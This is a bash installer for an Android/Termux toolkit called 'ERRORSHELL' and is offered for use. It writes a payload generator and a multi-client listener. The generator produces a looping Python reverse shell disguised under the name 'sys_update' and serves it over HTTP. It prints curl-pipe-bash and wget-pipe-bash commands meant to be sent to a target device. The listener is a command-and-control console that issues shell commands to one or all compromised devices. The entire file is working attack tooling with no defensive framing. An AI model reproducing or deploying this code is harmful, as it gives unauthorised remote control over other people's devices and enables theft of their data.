#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${RED}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║              ERRORSHELL - COMPLETE INSTALLER                   ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${BLUE}[*] Updating packages...${NC}"
pkg update -y 2>/dev/null
pkg upgrade -y 2>/dev/null

echo -e "${BLUE}[*] Installing Python...${NC}"
pkg install python -y 2>/dev/null

echo -e "${BLUE}[*] Installing netcat...${NC}"
pkg install netcat-openbsd -y 2>/dev/null

echo -e "${BLUE}[*] Installing curl...${NC}"
pkg install curl -y 2>/dev/null

echo -e "${BLUE}[*] Installing wget...${NC}"
pkg install wget -y 2>/dev/null

echo -e "${BLUE}[*] Installing requests...${NC}"
pip install requests 2>/dev/null

mkdir -p "$HOME/.errorshell/payloads"
mkdir -p "$HOME/.errorshell/logs"

cat > payload_creator.py << 'EOF'
#!/usr/bin/env python3
import os
import sys
import random
import socket
import http.server
import socketserver
import threading
import time

PAYLOAD_DIR = os.path.expanduser("~/.errorshell/payloads")
SERVER_PORT = 8000

os.makedirs(PAYLOAD_DIR, exist_ok=True)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def find_free_port():
    port = SERVER_PORT
    while port < SERVER_PORT + 100:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(("", port))
                return port
        except:
            port += 1
    return SERVER_PORT

def start_file_server(payload_path, port):
    os.chdir(payload_path)
    handler = http.server.SimpleHTTPRequestHandler
    try:
        httpd = socketserver.TCPServer(("", port), handler)
        thread = threading.Thread(target=httpd.serve_forever)
        thread.daemon = True
        thread.start()
        return httpd, thread
    except:
        return None, None

def create_payload(ip, port, save_path):
    random_num = random.randint(1000, 9999)
    payload_name = f"sys_update_{random_num}.sh"
    payload_file = os.path.join(save_path, payload_name)
    
    content = f'''#!/system/bin/sh
IP="{ip}"
PORT={port}
while true; do
    (python3 -c "import socket,subprocess,os,pty;s=socket.socket();s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/system/bin/sh')" 2>/dev/null) &
    sleep 10
done
'''
    with open(payload_file, "w") as f:
        f.write(content)
    os.chmod(payload_file, 0o755)
    return payload_name, payload_file

def main():
    os.system("clear")
    print("\033[91m")
    print("╔═══════════════════════════════════════════════════════════════╗")
    print("║              ERRORSHELL - PAYLOAD CREATOR                      ║")
    print("╚═══════════════════════════════════════════════════════════════╝")
    print("\033[0m")
    
    save_path = input(f"\033[96mEnter payload save path (default: {PAYLOAD_DIR}): \033[0m").strip()
    if not save_path:
        save_path = PAYLOAD_DIR
    os.makedirs(save_path, exist_ok=True)
    
    ip = get_local_ip()
    print(f"\033[92m[✓] Your Local IP: {ip}\033[0m")
    
    listen_port = input("\033[96mEnter listener port (default 4444): \033[0m").strip()
    listen_port = int(listen_port) if listen_port else 4444
    
    print(f"\033[94m[*] Creating payload...\033[0m")
    payload_name, payload_file = create_payload(ip, listen_port, save_path)
    print(f"\033[92m[✓] Payload created: {payload_name}\033[0m")
    print(f"\033[92m[✓] Payload saved at: {payload_file}\033[0m")
    
    server_port = find_free_port()
    print(f"\033[94m[*] Starting file server on port {server_port}...\033[0m")
    httpd, thread = start_file_server(save_path, server_port)
    
    if httpd:
        print(f"\033[92m[✓] File server started on port {server_port}\033[0m")
        local_url = f"http://{ip}:{server_port}/{payload_name}"
        
        print("\n" + "="*60)
        print(f"\033[92m  🎯 SEND THIS COMMAND TO TARGET 🎯\033[0m")
        print("="*60)
        print(f"\n\033[96m  curl -sSL {local_url} | bash\033[0m")
        print(f"\n\033[96m  wget -qO- {local_url} | bash\033[0m")
        print("\n" + "="*60)
        print(f"\033[93m  [IMPORTANT] First run: python listener.py\033[0m")
        print(f"\033[93m  Then run this command on target device\033[0m")
        print("\n" + "="*60)
        print(f"\n\033[93m[*] Press Ctrl+C to stop server\033[0m\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\033[91m[!] Shutting down server...\033[0m")
            httpd.shutdown()
            sys.exit(0)
    else:
        print(f"\033[91m[✗] Failed to start server\033[0m")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Shutting down...\033[0m")
        sys.exit(0)
EOF

cat > listener.py << 'EOF'
#!/usr/bin/env python3
import socket
import threading
import sys
import os
import time

active_clients = {}
client_counter = 0
client_lock = threading.Lock()

def clear_screen():
    os.system('clear')

def show_banner():
    print("\033[91m")
    print("╔═══════════════════════════════════════════════════════════════╗")
    print("║              ERRORSHELL - MULTI CLIENT LISTENER                ║")
    print("╚═══════════════════════════════════════════════════════════════╝")
    print("\033[0m")

def list_clients():
    with client_lock:
        print("\n\033[96m" + "="*60)
        print("  ACTIVE CONNECTIONS")
        print("="*60 + "\033[0m")
        if not active_clients:
            print("\033[91m  No active connections\033[0m")
        else:
            for idx, (cid, info) in enumerate(active_clients.items(), 1):
                print(f"  \033[92m{idx}. {cid}\033[0m - {info['addr'][0]}:{info['addr'][1]}")
        print("\033[96m" + "="*60 + "\033[0m")
        return len(active_clients)

def send_to_client(client_id, command):
    with client_lock:
        if client_id in active_clients:
            try:
                active_clients[client_id]['socket'].send((command + '\n').encode())
                return True
            except:
                return False
    return False

def send_to_all(command):
    sent = 0
    with client_lock:
        for client_id, client in list(active_clients.items()):
            try:
                client['socket'].send((command + '\n').encode())
                sent += 1
            except:
                pass
    return sent

def handle_client(client_socket, addr, client_id):
    with client_lock:
        active_clients[client_id] = {
            'socket': client_socket,
            'addr': addr,
            'connected_at': time.strftime("%H:%M:%S")
        }
    
    print(f"\n\033[92m[+] New connection: {client_id} from {addr[0]}:{addr[1]}\033[0m")
    print(f"\033[93m[*] Total active: {len(active_clients)}\033[0m")
    
    try:
        while True:
            client_socket.settimeout(0.5)
            try:
                data = client_socket.recv(4096)
                if not data:
                    break
                sys.stdout.write(f"\n\033[90m[{client_id}]\033[0m {data.decode('utf-8', errors='ignore')}")
                sys.stdout.flush()
            except socket.timeout:
                continue
            except:
                break
    except:
        pass
    finally:
        with client_lock:
            if client_id in active_clients:
                del active_clients[client_id]
        client_socket.close()
        print(f"\n\033[91m[-] Disconnected: {client_id}\033[0m")
        print(f"\033[93m[*] Active connections: {len(active_clients)}\033[0m")

def start_listener(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", port))
        server.listen(50)
        print(f"\033[92m[✓] Listener started on port {port}\033[0m")
        print(f"\033[93m[*] Waiting for connections...\033[0m\n")
    except Exception as e:
        print(f"\033[91m[✗] Failed to bind to port {port}: {e}\033[0m")
        print(f"\033[93m[*] Try a different port or close other programs\033[0m")
        sys.exit(1)
    
    while True:
        client, addr = server.accept()
        global client_counter
        client_counter += 1
        client_id = f"Device_{client_counter}"
        threading.Thread(target=handle_client, args=(client, addr, client_id), daemon=True).start()

def interactive_menu():
    current_target = None
    
    while True:
        if not current_target:
            clear_screen()
            show_banner()
            list_clients()
            
            if not active_clients:
                print("\n\033[93m[!] No active connections. Waiting...\033[0m")
                time.sleep(2)
                continue
            
            print("\n\033[93mOptions:\033[0m")
            print("  \033[96m[number]\033[0m - Select client")
            print("  \033[96m[all]\033[0m   - Send to all clients")
            print("  \033[96m[list]\033[0m   - Refresh list")
            print("  \033[96m[exit]\033[0m   - Quit listener")
            
            choice = input("\n\033[93mSelect target: \033[0m").strip()
            
            if choice.lower() == 'exit':
                print("\033[91m[!] Exiting...\033[0m")
                sys.exit(0)
            elif choice.lower() == 'list':
                continue
            elif choice.lower() == 'all':
                current_target = 'all'
            else:
                try:
                    idx = int(choice) - 1
                    clients_list = list(active_clients.keys())
                    if 0 <= idx < len(clients_list):
                        current_target = clients_list[idx]
                    else:
                        print("\033[91m[!] Invalid selection\033[0m")
                        time.sleep(1)
                        continue
                except:
                    print("\033[91m[!] Invalid input\033[0m")
                    time.sleep(1)
                    continue
        
        if current_target == 'all':
            prompt = f"\033[96mall> \033[0m"
        else:
            prompt = f"\033[96m{current_target}> \033[0m"
        
        cmd = input(prompt).strip()
        
        if not cmd:
            continue
        elif cmd.lower() == 'exit':
            current_target = None
            continue
        elif cmd.lower() == 'back':
            current_target = None
            continue
        elif cmd.lower() == 'list':
            current_target = None
            continue
        elif current_target == 'all':
            sent = send_to_all(cmd)
            print(f"\033[92m[✓] Command sent to {sent} devices\033[0m")
        else:
            if send_to_client(current_target, cmd):
                time.sleep(0.3)
            else:
                print(f"\033[91m[!] Device disconnected\033[0m")
                current_target = None
                time.sleep(1)

def main():
    clear_screen()
    show_banner()
    
    port = input("\033[96mEnter port to listen on (default 4444): \033[0m").strip()
    port = int(port) if port else 4444
    
    listener_thread = threading.Thread(target=start_listener, args=(port,), daemon=True)
    listener_thread.start()
    
    time.sleep(1)
    interactive_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Shutting down...\033[0m")
        sys.exit(0)
EOF

cat > start_listener.sh << 'EOF'
#!/bin/bash
echo -e "\033[92m[*] Starting ERRORSHELL Listener...\033[0m"
python listener.py
EOF

cat > start_payload.sh << 'EOF'
#!/bin/bash
echo -e "\033[92m[*] Starting ERRORSHELL Payload Creator...\033[0m"
python payload_creator.py
EOF

chmod +x payload_creator.py
chmod +x listener.py
chmod +x start_listener.sh
chmod +x start_payload.sh

echo -e "\n${GREEN}[✓] All tools created successfully!${NC}"
echo -e "\n${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  🚀 ERRORSHELL TOOLS READY! 🚀${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "\n${YELLOW}📁 Files created:${NC}"
echo -e "  ${CYAN}1. payload_creator.py${NC} - Generate reverse shell payload"
echo -e "  ${CYAN}2. listener.py${NC} - Multi-client listener"
echo -e "  ${CYAN}3. start_listener.sh${NC} - Quick start listener"
echo -e "  ${CYAN}4. start_payload.sh${NC} - Quick start payload creator"
echo -e "\n${YELLOW}📖 HOW TO USE:${NC}"
echo -e "  ${GREEN}STEP 1 (TERMINAL 1):${NC} ./start_listener.sh"
echo -e "  ${GREEN}STEP 2 (TERMINAL 2):${NC} ./start_payload.sh"
echo -e "  ${GREEN}STEP 3:${NC} Copy curl command from terminal 2"
echo -e "  ${GREEN}STEP 4:${NC} Run curl command on target device"
echo -e "  ${GREEN}STEP 5:${NC} Type 'list' in terminal 1 to see connections"
echo -e "  ${GREEN}STEP 6:${NC} Select device number and start typing commands"
echo -e "\n${YELLOW}📝 Example:${NC}"
echo -e "  Device_1> ls"
echo -e "  Device_1> pwd"
echo -e "  Device_1> cd /sdcard"
echo -e "  Device_1> ls -la"
echo -e "\n${RED}⚠️  IMPORTANT: Run listener FIRST, then payload creator!${NC}"
echo -e "${RED}⚠️  Target device must be on SAME NETWORK!${NC}\n"

read -p $'\n'"${YELLOW}Do you want to start the LISTENER now? (y/n): ${NC}" run_now
if [[ $run_now == "y" || $run_now == "Y" ]]; then
    python listener.py
fi
